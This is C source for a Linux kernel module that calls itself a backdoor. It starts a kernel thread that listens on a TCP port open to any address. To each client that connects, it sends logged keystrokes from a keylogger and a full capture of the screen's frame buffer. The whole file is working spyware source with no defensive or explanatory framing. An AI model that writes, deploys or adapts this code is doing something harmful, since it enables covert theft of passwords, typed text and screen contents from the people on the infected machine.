#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/tcp.h>
#include <linux/socket.h>
#include <linux/kthread.h>
#include <linux/sched.h>

#include "backdoor_socket.h"
#include "framelogger.h"
#include "keylogger.h"

// the main socket for the server, which is unique for the whole module.
static struct socket *sock;

// the task struct for the thread that will be handling connections.
static struct task_struct *listener;

/*
 * send_message handles the connection with an accepted client, sending and
 * receiving messages about the status of collected data in the backdoor.
 */
static void send_message(struct socket *conn)
{
	struct msghdr msg = { 0 };
	struct frame_buffer fb;

	struct kvec iov = {
		.iov_base = read_key_history(),
		.iov_len = BUFFER_SIZE,
	};
	int b;

	record_frame_buffer(&fb);

	printk(KERN_INFO "sending keyboard data\n");
	kernel_sendmsg(conn, &msg, &iov, 1, BUFFER_SIZE);

	((int *)iov.iov_base)[0] = fb.xres;
	((int *)iov.iov_base)[1] = fb.yres;

	printk(KERN_INFO "sending resolution\n");
	kernel_sendmsg(conn, &msg, &iov, 1, sizeof(int)*2);

	printk(KERN_INFO "starting send pixel data\n");
	for (b = 0; b < 3 * fb.xres * fb.yres; b += BUFFER_SIZE) {
		memcpy(iov.iov_base, fb.rgb_buffer + b, BUFFER_SIZE);
		kernel_sendmsg(conn, &msg, &iov, 1, BUFFER_SIZE);
	}
	printk(KERN_INFO "start sending padding data\n");

	memcpy(iov.iov_base, fb.rgb_buffer,
	       BUFFER_SIZE - ((3 * fb.xres * fb.yres) % BUFFER_SIZE));

	kernel_sendmsg(conn, &msg, &iov, 1,
		       BUFFER_SIZE - ((3 * fb.xres * fb.yres) % BUFFER_SIZE));

	printk(KERN_INFO "done\n");

	clean_frame_buffer(&fb);
  kfree(iov.iov_base);
}

/*
 * backdoor_socket_listen runs in the background accepting connections from
 * external clients and sending messages to them.
 */
static int backdoor_socket_listen(void *_)
{
	while (true) {
		struct socket *conn = sock_alloc();
		int err;
		conn->type = sock->type;
		conn->ops = sock->ops;

		printk(KERN_INFO "backdoor: waiting on accept\n");

		// the thread will block here to wait for a client, if one is not in the
		// queue
		err = sock->ops->accept(sock, conn, O_RDWR, true);
		if (err < 0) {
			conn->ops->release(conn);

			// here either the module is being terminated or some problem happend,
			// so check the condition and exit accordingly
			if (kthread_should_stop()) {
				break;
			}

			printk(KERN_ERR
			       "backdoor: error accepting connection, exiting\n");
			return err;
		}
		printk(KERN_INFO "backdoor: accepted connection\n");

		// if we accepted a client normally, send the backdoor message
		send_message(conn);

		// and close the connection when we are done
		conn->ops->shutdown(conn, SHUT_RDWR);
		conn->ops->release(conn);
	}

	printk(KERN_INFO "backdoor: exiting listener\n");
	return 0;
}

/*
 * backdoor_socket_init creates the listener task and main connection socket
 * for the backdoor on a certain port.
 */
int __init backdoor_socket_init(int port)
{
	int err;
	struct sockaddr_in sin;

	// set the address: connect with anyone in the specified port
	memset(&sin, 0, sizeof(struct sockaddr_in));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_port = htons(port);

	// ceate the socket, it should be a kernel socket because we use data alloc'd
	// in kernelspace
	err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP,
			       &sock);
	if (err < 0) {
		goto errl1;
	}

	// bind the address to the socket
	err = sock->ops->bind(sock, (struct sockaddr *)&sin, sizeof(sin));
	if (err < 0) {
		goto errl2;
	}

	// listen on that socket, with a certain queue size
	err = sock->ops->listen(sock, BACKDOOR_SOCK_QUEUE_SIZE);
	if (err < 0) {
		goto errl2;
	}

	// start the listener process
	listener =
		kthread_run(backdoor_socket_listen, NULL, "backdoor listener");
	if (listener == NULL) {
		err = PTR_ERR(listener);
		goto errl2;
	}

	return 0;

	// if any problem occurs, because we are in kernelspace, we MUST free all
	// resources alloc'd
errl2:
	sock_release(sock);
errl1:
	return err;
}

/*
 * backdoor_socket_exit closes the listener socket and stops the listener
 * kthread.
 */
void __exit backdoor_socket_exit(void)
{
	sock->ops->shutdown(sock, SHUT_RDWR);
	kthread_stop(listener);
	sock->ops->release(sock);
}
